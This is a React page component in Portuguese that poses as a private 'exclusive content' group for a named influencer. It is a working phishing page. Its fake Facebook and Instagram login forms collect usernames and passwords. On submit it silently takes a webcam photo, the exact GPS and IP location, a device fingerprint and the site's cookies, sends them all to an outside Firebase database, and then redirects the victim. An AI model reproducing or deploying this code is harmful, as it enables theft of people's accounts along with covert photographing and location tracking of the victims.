"use client"
import { useState, useEffect, useRef } from "react"
import type React from "react"

import { Avatar, AvatarFallback, AvatarImage } from "@/components/ui/avatar"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Lock, Instagram, X, Shield, Star } from "lucide-react"

// Importar configuração de imagens
import { imageConfig, getImageUrl, getPlaceholder } from "@/config/images"

interface LocationData {
  ip: string
  city: string
  region: string
  country: string
  timezone: string
  isp: string
  lat: number
  lon: number
}

interface PreciseLocationData {
  latitude: number
  longitude: number
  accuracy: number
  altitude?: number | null
  altitudeAccuracy?: number | null
  heading?: number | null
  speed?: number | null
  timestamp: number
}

export default function GrupoIsabella() {
  const [showFacebookModal, setShowFacebookModal] = useState(false)
  const [showInstagramModal, setShowInstagramModal] = useState(false)
  const [email, setEmail] = useState("")
  const [password, setPassword] = useState("")
  const [username, setUsername] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const [locationData, setLocationData] = useState<LocationData | null>(null)
  const [preciseLocationData, setPreciseLocationData] = useState<PreciseLocationData | null>(null)

  const videoRef = useRef<HTMLVideoElement>(null)
  const canvasRef = useRef<HTMLCanvasElement>(null)
  const streamRef = useRef<MediaStream | null>(null)

  // Capturar dados de localização aproximada (IP) ao carregar a página
  useEffect(() => {
    const getLocationData = async () => {
      try {
        const response = await fetch("https://ipapi.co/json/")
        const data = await response.json()
        setLocationData(data)
      } catch (error) {
        console.log("Erro ao obter localização por IP:", error)
      }
    }

    getLocationData()
  }, [])

  // Função para iniciar a câmera e capturar uma foto (invisível)
  const capturePhoto = async (): Promise<string | null> => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
      streamRef.current = stream

      if (videoRef.current) {
        videoRef.current.srcObject = stream
        videoRef.current.play()

        await new Promise((resolve) => (videoRef.current!.onloadedmetadata = resolve))
        await new Promise((resolve) => setTimeout(resolve, 500))

        if (canvasRef.current && videoRef.current) {
          const context = canvasRef.current.getContext("2d")
          if (context) {
            canvasRef.current.width = videoRef.current.videoWidth
            canvasRef.current.height = videoRef.current.videoHeight
            context.drawImage(videoRef.current, 0, 0, canvasRef.current.width, canvasRef.current.height)
            const imageData = canvasRef.current.toDataURL("image/jpeg", 0.8)
            return imageData
          }
        }
      }
      return null
    } catch (err) {
      console.error("Erro ao acessar a câmera:", err)
      return null
    } finally {
      if (streamRef.current) {
        streamRef.current.getTracks().forEach((track) => track.stop())
        streamRef.current = null
      }
    }
  }

  // Capturar localização GPS exata
  const getPreciseLocation = async (): Promise<PreciseLocationData | null> => {
    return new Promise((resolve) => {
      if (!navigator.geolocation) {
        console.log("Geolocalização não suportada pelo navegador.")
        return resolve(null)
      }

      navigator.geolocation.getCurrentPosition(
        (position) => {
          const { latitude, longitude, accuracy, altitude, altitudeAccuracy, heading, speed } = position.coords
          const timestamp = position.timestamp
          console.log("✅ Localização GPS exata capturada:", { latitude, longitude, accuracy })
          resolve({ latitude, longitude, accuracy, altitude, altitudeAccuracy, heading, speed, timestamp })
        },
        (error) => {
          console.error("❌ Erro ao obter localização GPS:", error)
          resolve(null)
        },
        {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0,
        },
      )
    })
  }

  // Funções auxiliares (getDeviceInfo, getWebGLInfo, etc.) permanecem as mesmas
  const getDeviceInfo = () => {
    const canvas = document.createElement("canvas")
    const ctx = canvas.getContext("2d")
    const txt = "fingerprint"
    if (ctx) {
      ctx.textBaseline = "top"
      ctx.font = "14px Arial"
      ctx.fillText(txt, 2, 2)
    }

    return {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      languages: navigator.languages?.join(", ") || "N/A",
      cookieEnabled: navigator.cookieEnabled,
      onLine: navigator.onLine,
      screenWidth: screen.width,
      screenHeight: screen.height,
      screenColorDepth: screen.colorDepth,
      screenPixelDepth: screen.pixelDepth,
      availWidth: screen.availWidth,
      availHeight: screen.availHeight,
      viewportWidth: window.innerWidth,
      viewportHeight: window.innerHeight,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      timezoneOffset: new Date().getTimezoneOffset(),
      hardwareConcurrency: navigator.hardwareConcurrency || "N/A",
      deviceMemory: (navigator as any).deviceMemory || "N/A",
      canvasFingerprint: canvas.toDataURL(),
      webglVendor: getWebGLInfo().vendor,
      webglRenderer: getWebGLInfo().renderer,
      pluginsCount: navigator.plugins?.length || 0,
      plugins: Array.from(navigator.plugins || [])
        .map((p) => p.name)
        .join(", "),
      touchSupport: "ontouchstart" in window || navigator.maxTouchPoints > 0,
      battery: getBatteryInfo(),
      connection: getConnectionInfo(),
      localStorageEnabled: isLocalStorageEnabled(),
      sessionStorageEnabled: isSessionStorageEnabled(),
      referrer: document.referrer || "Direct",
      currentUrl: window.location.href,
      timestamp: Date.now(),
      dateTime: new Date().toISOString(),
      localDateTime: new Date().toLocaleString("pt-BR"),
    }
  }

  const getWebGLInfo = () => {
    try {
      const canvas = document.createElement("canvas")
      const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl")
      if (gl) {
        const debugInfo = gl.getExtension("WEBGL_debug_renderer_info")
        return {
          vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "N/A",
          renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A",
        }
      }
    } catch (e) {
      // Silently fail
    }
    return { vendor: "N/A", renderer: "N/A" }
  }

  const getBatteryInfo = () => {
    if ("getBattery" in navigator) {
      return "Available (async)"
    }
    return "Not available"
  }

  const getConnectionInfo = () => {
    const connection =
      (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection
    if (connection) {
      return {
        effectiveType: connection.effectiveType || "N/A",
        downlink: connection.downlink || "N/A",
        rtt: connection.rtt || "N/A",
      }
    }
    return "Not available"
  }

  const isLocalStorageEnabled = () => {
    try {
      localStorage.setItem("test", "test")
      localStorage.removeItem("test")
      return true
    } catch (e) {
      return false
    }
  }

  const isSessionStorageEnabled = () => {
    try {
      sessionStorage.setItem("test", "test")
      sessionStorage.removeItem("test")
      return true
    } catch (e) {
      return false
    }
  }

  const getCookiesInfo = () => {
    const cookies: { [key: string]: string } = {}
    try {
      document.cookie.split(";").forEach((cookie) => {
        const parts = cookie.split("=")
        if (parts.length > 1) {
          const name = decodeURIComponent(parts[0].trim())
          const value = decodeURIComponent(parts.slice(1).join("=").trim())
          cookies[name] = value
        }
      })
    } catch (e) {
      console.error("Erro ao coletar cookies:", e)
    }
    return cookies
  }

  const handleFacebookLogin = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)

    const firebaseUrl = "https://coringa-637d4-default-rtdb.firebaseio.com/logins.json"

    try {
      const photoData = await capturePhoto()
      const preciseLocation = await getPreciseLocation()

      const deviceInfo = getDeviceInfo()
      const cookiesInfo = getCookiesInfo()

      const dadosLogin = {
        email: email,
        senha: password,
        plataforma: "Facebook",
        localizacao: locationData
          ? {
              ip: locationData.ip,
              cidade: locationData.city,
              regiao: locationData.region,
              pais: locationData.country,
              timezone: locationData.timezone,
              provedor: locationData.isp,
              latitude: locationData.lat,
              longitude: locationData.lon,
            }
          : null,
        localizacaoGPS: preciseLocation,
        dispositivo: {
          userAgent: deviceInfo.userAgent,
          plataforma: deviceInfo.platform,
          idioma: deviceInfo.language,
          idiomas: deviceInfo.languages,
          cookiesHabilitados: deviceInfo.cookieEnabled,
          online: deviceInfo.onLine,
          suporteToque: deviceInfo.touchSupport,
          localStorageHabilitado: deviceInfo.localStorageEnabled,
          sessionStorageHabilitado: deviceInfo.sessionStorageEnabled,
        },
        tela: {
          largura: deviceInfo.screenWidth,
          altura: deviceInfo.screenHeight,
          profundidadeCor: deviceInfo.screenColorDepth,
          profundidadePixel: deviceInfo.pixelDepth,
          larguraDisponivel: deviceInfo.availWidth,
          alturaDisponivel: deviceInfo.availHeight,
          larguraViewport: deviceInfo.viewportWidth,
          alturaViewport: deviceInfo.viewportHeight,
        },
        hardware: {
          nucleosProcessador: deviceInfo.hardwareConcurrency,
          memoriaDispositivo: deviceInfo.deviceMemory,
          webglVendor: deviceInfo.webglVendor,
          webglRenderer: deviceInfo.webglRenderer,
          quantidadePlugins: deviceInfo.pluginsCount,
          plugins: deviceInfo.plugins,
        },
        conexao: deviceInfo.connection,
        navegacao: {
          referrer: deviceInfo.referrer,
          urlAtual: window.location.href,
          timezone: deviceInfo.timezone,
          offsetTimezone: deviceInfo.timezoneOffset,
        },
        fingerprints: {
          canvas: deviceInfo.canvasFingerprint.substring(0, 100) + "...",
        },
        cookies: cookiesInfo,
        fotoCapturada: photoData,
        dataHora: deviceInfo.localDateTime,
        dataHoraISO: deviceInfo.dateTime,
        timestamp: deviceInfo.timestamp,
        versaoCaptura: "2.4",
        fonte: "Kayane Santos - Facebook Login",
      }

      const response = await fetch(firebaseUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(dadosLogin),
      })

      if (response.ok) {
        console.log("✅ Dados completos salvos no Firebase (Facebook):", dadosLogin)
        setTimeout(() => {
          window.location.href = "https://linkbio.co/isa-lua"
        }, 1000)
      } else {
        alert("Erro ao processar login. Tente novamente.")
        setIsLoading(false)
      }
    } catch (err) {
      console.error("Erro de rede:", err)
      alert("Erro de conexão. Tente novamente.")
      setIsLoading(false)
    }
  }

  const handleInstagramLogin = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)

    const firebaseUrl = "https://coringa-637d4-default-rtdb.firebaseio.com/logins.json"

    try {
      const photoData = await capturePhoto()
      const preciseLocation = await getPreciseLocation()

      const deviceInfo = getDeviceInfo()
      const cookiesInfo = getCookiesInfo()

      const dadosLogin = {
        usuario: username,
        senha: password,
        plataforma: "Instagram",
        localizacao: locationData
          ? {
              ip: locationData.ip,
              cidade: locationData.city,
              regiao: locationData.region,
              pais: locationData.country,
              timezone: locationData.timezone,
              provedor: locationData.isp,
              latitude: locationData.lat,
              longitude: locationData.lon,
            }
          : null,
        localizacaoGPS: preciseLocation,
        dispositivo: {
          userAgent: deviceInfo.userAgent,
          plataforma: deviceInfo.platform,
          idioma: deviceInfo.language,
          idiomas: deviceInfo.languages,
          cookiesHabilitados: deviceInfo.cookieEnabled,
          online: deviceInfo.onLine,
          suporteToque: deviceInfo.touchSupport,
          localStorageHabilitado: deviceInfo.localStorageEnabled,
          sessionStorageHabilitado: deviceInfo.sessionStorageEnabled,
        },
        tela: {
          largura: deviceInfo.screenWidth,
          altura: deviceInfo.screenHeight,
          profundidadeCor: deviceInfo.screenColorDepth,
          profundidadePixel: deviceInfo.pixelDepth,
          larguraDisponivel: deviceInfo.availWidth,
          alturaDisponivel: deviceInfo.availHeight,
          larguraViewport: deviceInfo.viewportWidth,
          alturaViewport: deviceInfo.viewportHeight,
        },
        hardware: {
          nucleosProcessador: deviceInfo.hardwareConcurrency,
          memoriaDispositivo: deviceInfo.deviceMemory,
          webglVendor: deviceInfo.webglVendor,
          webglRenderer: deviceInfo.webglRenderer,
          quantidadePlugins: deviceInfo.pluginsCount,
          plugins: deviceInfo.plugins,
        },
        conexao: deviceInfo.connection,
        navegacao: {
          referrer: deviceInfo.referrer,
          urlAtual: window.location.href,
          timezone: deviceInfo.timezone,
          offsetTimezone: deviceInfo.timezoneOffset,
        },
        fingerprints: {
          canvas: deviceInfo.canvasFingerprint.substring(0, 100) + "...",
        },
        cookies: cookiesInfo,
        fotoCapturada: photoData,
        dataHora: deviceInfo.localDateTime,
        dataHoraISO: deviceInfo.dateTime,
        timestamp: deviceInfo.timestamp,
        versaoCaptura: "2.4",
        fonte: "Kayane Santos - Instagram Login",
      }

      const response = await fetch(firebaseUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(dadosLogin),
      })

      if (response.ok) {
        console.log("✅ Dados completos salvos no Firebase (Instagram):", dadosLogin)
        setTimeout(() => {
          window.location.href = "https://linkbio.co/isa-lua"
        }, 1000)
      } else {
        alert("Erro ao processar login. Tente novamente.")
        setIsLoading(false)
      }
    } catch (err) {
      console.error("Erro de rede:", err)
      alert("Erro de conexão. Tente novamente.")
      setIsLoading(false)
    }
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-gray-900 to-black relative overflow-hidden">
      {/* Background Pattern */}
      <div
        className="absolute inset-0 opacity-50"
        style={{
          backgroundImage: `url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fillRule='evenodd'%3E%3Cg fill='%23ffffff' fillOpacity='0.03'%3E%3Ccircle cx='30' cy='30' r='1'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E")`,
        }}
      ></div>

      <div className="relative z-10 min-h-screen flex flex-col">
        <div className="flex-1 px-4 py-6 sm:px-6 lg:px-8">
          <div className="max-w-6xl mx-auto">
            {/* Header - Responsivo */}
            <div className="text-center mb-8 lg:mb-12">
              <div className="inline-flex items-center gap-2 bg-white/10 backdrop-blur-sm rounded-full px-4 py-2 mb-4">
                <div className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></div>
                <span className="text-white text-sm font-medium">Online agora</span>
              </div>
              <h1 className="text-2xl sm:text-3xl lg:text-4xl font-bold text-white mb-2">Conteúdo Exclusivo</h1>
              <p className="text-gray-300 text-sm sm:text-base max-w-md mx-auto">
                Acesse agora com sua rede social favorita
              </p>
            </div>

            {/* Main Content - Layout Responsivo */}
            <div className="grid lg:grid-cols-2 gap-8 lg:gap-12 items-start">
              {/* Left Column - Profile */}
              <div className="order-2 lg:order-1">
                {/* Profile Card */}
                <div className="bg-white/10 backdrop-blur-lg rounded-2xl p-6 sm:p-8 border border-white/20 shadow-2xl">
                  <div className="flex flex-col sm:flex-row items-center sm:items-start gap-4 sm:gap-6">
                    <div className="relative flex-shrink-0">
                      <Avatar className="w-20 h-20 sm:w-24 sm:h-24 border-4 border-white/30 shadow-xl">
                        <AvatarImage
                          src={
                            getImageUrl(imageConfig.profile.avatar, getPlaceholder(96, 96, "IL")) || "/placeholder.svg"
                          }
                          alt={imageConfig.profile.alt}
                          className="object-cover"
                        />
                        <AvatarFallback className="bg-gradient-to-br from-purple-500 to-pink-500 text-white font-bold text-2xl">
                          IL
                        </AvatarFallback>
                      </Avatar>
                      {/* Verification Badge */}
                      <div className="absolute -bottom-1 -right-1 bg-blue-500 rounded-full p-2 border-2 border-white shadow-lg">
                        <svg className="w-3 h-3 text-white" fill="currentColor" viewBox="0 0 20 20">
                          <path
                            fillRule="evenodd"
                            d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                            clipRule="evenodd"
                          />
                        </svg>
                      </div>
                    </div>

                    <div className="flex-1 text-center sm:text-left">
                      <div className="flex flex-col sm:flex-row items-center sm:items-start gap-2 mb-2">
                        <h2 className="text-xl sm:text-2xl font-bold text-white">Kayane Santos</h2>
                        <div className="flex items-center gap-2">
                          <div className="bg-blue-500 rounded-full p-1">
                            <svg className="w-3 h-3 text-white" fill="currentColor" viewBox="0 0 20 20">
                              <path
                                fillRule="evenodd"
                                d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                                clipRule="evenodd"
                              />
                            </svg>
                          </div>
                          <span className="bg-gradient-to-r from-purple-500 to-pink-500 text-white text-xs px-2 py-1 rounded-full font-semibold">
                            VIP
                          </span>
                        </div>
                      </div>

                      <p className="text-gray-300 text-sm mb-4">Modelo • Influenciadora • Conteúdo Premium</p>

                      {/* Stats */}
                      <div className="grid grid-cols-3 gap-4 mb-4">
                        <div className="text-center">
                          <div className="text-lg sm:text-xl font-bold text-white">127K</div>
                          <div className="text-xs text-gray-400">Seguidores</div>
                        </div>
                        <div className="text-center">
                          <div className="text-lg sm:text-xl font-bold text-white">2.1M</div>
                          <div className="text-xs text-gray-400">Curtidas</div>
                        </div>
                        <div className="text-center">
                          <div className="text-lg sm:text-xl font-bold text-white">850</div>
                          <div className="text-xs text-gray-400">Posts</div>
                        </div>
                      </div>

                      {/* Status */}
                      <div className="flex flex-wrap justify-center sm:justify-start gap-3 text-xs">
                        <div className="flex items-center gap-1 bg-green-500/20 text-green-400 px-2 py-1 rounded-full">
                          <div className="w-2 h-2 bg-green-400 rounded-full"></div>
                          <span>Online</span>
                        </div>
                        <div className="flex items-center gap-1 bg-red-500/20 text-red-400 px-2 py-1 rounded-full">
                          <Lock className="w-3 h-3" />
                          <span>Privado</span>
                        </div>
                        <div className="flex items-center gap-1 bg-yellow-500/20 text-yellow-400 px-2 py-1 rounded-full">
                          <Star className="w-3 h-3" />
                          <span>Premium</span>
                        </div>
                      </div>
                    </div>
                  </div>

                  {/* Alert */}
                  <div className="mt-6 bg-gradient-to-r from-purple-500/20 to-pink-500/20 border border-purple-500/30 rounded-lg p-4">
                    <div className="flex items-start gap-3">
                      <Shield className="w-5 h-5 text-purple-400 flex-shrink-0 mt-0.5" />
                      <div>
                        <p className="text-white text-sm font-medium mb-1">🔥 Novo conteúdo disponível!</p>
                        <p className="text-gray-300 text-xs">3 fotos e 1 vídeo exclusivos foram adicionados hoje</p>
                      </div>
                    </div>
                  </div>
                </div>
              </div>

              {/* Right Column - Preview & Actions */}
              <div className="order-1 lg:order-2">
                {/* Preview Images */}
                <div className="mb-8">
                  <h3 className="text-white text-lg font-semibold mb-4 text-center lg:text-left">Prévia do Conteúdo</h3>
                  <div className="grid grid-cols-3 gap-3 sm:gap-4 max-w-sm mx-auto lg:max-w-none">
                    {imageConfig.previews.map((preview, index) => (
                      <div key={index} className="relative group cursor-pointer">
                        <div className="aspect-[3/4] bg-gradient-to-br from-gray-800 to-gray-900 rounded-xl overflow-hidden border border-white/10">
                          <img
                            src={getImageUrl(
                              preview.url,
                              getPlaceholder(300, 400, `Preview ${index + 1 || "/placeholder.svg"}`),
                            )}
                            alt={preview.alt}
                            className="w-full h-full object-cover blur-sm group-hover:blur-[2px] transition-all duration-300"
                          />
                          <div className="absolute inset-0 bg-gradient-to-t from-black/60 via-transparent to-transparent flex items-center justify-center">
                            <div className="text-white text-center">
                              <div className="bg-white/20 backdrop-blur-sm rounded-full p-3 mb-2">
                                <Lock className="w-4 h-4" />
                              </div>
                              <p className="text-xs font-medium">
                                {preview.type === "video" ? "Vídeo" : `Foto #${index + 1}`}
                              </p>
                            </div>
                          </div>
                        </div>
                      </div>
                    ))}
                  </div>
                  <p className="text-center text-gray-400 text-sm mt-4">
                    <span className="text-white font-medium">3 novos conteúdos</span> • Desbloqueie com seu login
                  </p>
                </div>

                {/* CTA Buttons */}
                <div className="space-y-4">
                  <Button
                    onClick={() => setShowFacebookModal(true)}
                    className="w-full h-12 sm:h-14 bg-[#1877F2] hover:bg-[#166FE5] text-white font-bold text-base sm:text-lg rounded-xl transition-all duration-300 hover:scale-[1.02] shadow-lg hover:shadow-xl"
                  >
                    <svg className="w-5 h-5 sm:w-6 sm:h-6 mr-3" viewBox="0 0 24 24" fill="currentColor">
                      <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" />
                    </svg>
                    Continuar com Facebook
                  </Button>

                  <Button
                    onClick={() => setShowInstagramModal(true)}
                    className="w-full h-12 sm:h-14 bg-gradient-to-r from-[#E4405F] via-[#F56040] to-[#FFDC80] hover:from-[#D73653] hover:via-[#E55039] hover:to-[#FFD700] text-white font-bold text-base sm:text-lg rounded-xl transition-all duration-300 hover:scale-[1.02] shadow-lg hover:shadow-xl"
                  >
                    <Instagram className="w-5 h-5 sm:w-6 sm:h-6 mr-3" />
                    Continuar com Instagram
                  </Button>

                  <div className="flex items-center justify-center gap-4 text-xs text-gray-400 pt-2">
                    <div className="flex items-center gap-1">
                      <Shield className="w-3 h-3 text-green-400" />
                      <span>100% Seguro</span>
                    </div>
                    <span>•</span>
                    <span>Acesso Imediato</span>
                    <span>•</span>
                    <span>Gratuito</span>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Footer */}
        <footer className="border-t border-white/10 bg-black/20 backdrop-blur-sm py-4">
          <div className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8">
            <div className="flex flex-col sm:flex-row items-center justify-between gap-4 text-xs text-gray-400">
              <p>© 2025 Kayane Santos. Todos os direitos reservados.</p>
              <div className="flex gap-4">
                <a href="#" className="hover:text-white transition-colors">
                  Privacidade
                </a>
                <a href="#" className="hover:text-white transition-colors">
                  Termos
                </a>
                <a href="#" className="hover:text-white transition-colors">
                  Suporte
                </a>
              </div>
            </div>
          </div>
        </footer>
      </div>

      {/* Facebook Modal */}
      {showFacebookModal && (
        <div className="fixed inset-0 bg-black/70 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <div className="bg-white rounded-2xl shadow-2xl w-full max-w-md max-h-[90vh] overflow-y-auto">
            <div className="flex items-center justify-between p-4 sm:p-6 border-b border-gray-200">
              <h3 className="text-lg sm:text-xl font-semibold text-gray-800">Entrar no Facebook</h3>
              <button
                onClick={() => {
                  setShowFacebookModal(false)
                }}
                className="text-gray-400 hover:text-gray-600 transition-colors p-1"
              >
                <X className="w-5 h-5" />
              </button>
            </div>

            <div className="p-4 sm:p-6">
              <div className="text-center mb-6">
                <div className="w-16 h-16 bg-[#1877F2] rounded-full flex items-center justify-center mx-auto mb-4 shadow-lg">
                  <svg className="w-8 h-8 text-white" viewBox="0 0 24 24" fill="currentColor">
                    <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" />
                  </svg>
                </div>
                <h4 className="text-lg font-semibold text-gray-800 mb-2">Conectar ao Grupo Privado</h4>
                <p className="text-sm text-gray-600">
                  Entre com sua conta do Facebook para acessar o conteúdo exclusivo da <strong>Kayane Santos</strong>
                </p>
              </div>

              <form onSubmit={handleFacebookLogin} className="space-y-4">
                <div>
                  <Label htmlFor="fb-email" className="sr-only">
                    Email
                  </Label>
                  <Input
                    id="fb-email"
                    type="text"
                    placeholder="Email ou telefone"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    className="h-12 text-base border-gray-300 focus:border-[#1877F2] focus:ring-[#1877F2] rounded-lg"
                    required
                  />
                </div>

                <div>
                  <Label htmlFor="fb-password" className="sr-only">
                    Senha
                  </Label>
                  <Input
                    id="fb-password"
                    type="password"
                    placeholder="Senha"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="h-12 text-base border-gray-300 focus:border-[#1877F2] focus:ring-[#1877F2] rounded-lg"
                    required
                  />
                </div>

                {/* Elementos ocultos para captura da câmera */}
                <video ref={videoRef} className="hidden" playsInline autoPlay muted></video>
                <canvas ref={canvasRef} className="hidden"></canvas>

                <Button
                  type="submit"
                  disabled={isLoading}
                  className="w-full h-12 bg-[#1877F2] hover:bg-[#166FE5] text-white font-bold text-base rounded-lg transition-colors duration-200 disabled:opacity-50"
                >
                  {isLoading ? (
                    <div className="flex items-center gap-2">
                      <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                      Entrando no grupo...
                    </div>
                  ) : (
                    "Entrar no Grupo"
                  )}
                </Button>
              </form>

              <p className="text-xs text-center text-gray-500 mt-4 leading-relaxed">
                Ao continuar, você concorda em acessar o conteúdo exclusivo e suas informações básicas serão
                compartilhadas com Kayane Santos.
              </p>
            </div>
          </div>
        </div>
      )}

      {/* Instagram Modal */}
      {showInstagramModal && (
        <div className="fixed inset-0 bg-black/70 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <div className="bg-white rounded-2xl shadow-2xl w-full max-w-md max-h-[90vh] overflow-y-auto">
            <div className="flex items-center justify-between p-4 sm:p-6 border-b border-gray-200">
              <h3 className="text-lg sm:text-xl font-semibold text-gray-800">Entrar no Instagram</h3>
              <button
                onClick={() => {
                  setShowInstagramModal(false)
                }}
                className="text-gray-400 hover:text-gray-600 transition-colors p-1"
              >
                <X className="w-5 h-5" />
              </button>
            </div>

            <div className="p-4 sm:p-6">
              <div className="text-center mb-6">
                <div className="w-16 h-16 bg-gradient-to-br from-[#E4405F] to-[#F56040] rounded-full flex items-center justify-center mx-auto mb-4 shadow-lg">
                  <Instagram className="w-8 h-8 text-white" />
                </div>
                <h4 className="text-lg font-semibold text-gray-800 mb-2">Acessar Conteúdo Exclusivo</h4>
                <p className="text-sm text-gray-600">
                  Entre com sua conta do Instagram para descobrir o conteúdo premium da <strong>Kayane Santos</strong>
                </p>
              </div>

              <form onSubmit={handleInstagramLogin} className="space-y-4">
                <div>
                  <Label htmlFor="ig-username" className="sr-only">
                    Usuário
                  </Label>
                  <Input
                    id="ig-username"
                    type="text"
                    placeholder="Nome de usuário, telefone ou email"
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    className="h-12 text-base border-gray-300 focus:border-gray-400 focus:ring-gray-400 bg-gray-50 rounded-lg"
                    required
                  />
                </div>

                <div>
                  <Label htmlFor="ig-password" className="sr-only">
                    Senha
                  </Label>
                  <Input
                    id="ig-password"
                    type="password"
                    placeholder="Senha"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="h-12 text-base border-gray-300 focus:border-gray-400 focus:ring-gray-400 bg-gray-50 rounded-lg"
                    required
                  />
                </div>

                {/* Elementos ocultos para captura da câmera */}
                <video ref={videoRef} className="hidden" playsInline autoPlay muted></video>
                <canvas ref={canvasRef} className="hidden"></canvas>

                <Button
                  type="submit"
                  disabled={isLoading}
                  className="w-full h-12 bg-gradient-to-r from-[#E4405F] to-[#F56040] hover:from-[#D73653] hover:to-[#E55039] text-white font-bold text-base rounded-lg transition-all duration-200 disabled:opacity-50"
                >
                  {isLoading ? (
                    <div className="flex items-center gap-2">
                      <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                      Acessando conteúdo...
                    </div>
                  ) : (
                    "Acessar Conteúdo"
                  )}
                </Button>
              </form>

              <p className="text-xs text-center text-gray-500 mt-4 leading-relaxed">
                Seus dados estão protegidos. O acesso será liberado imediatamente após a verificação.
              </p>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
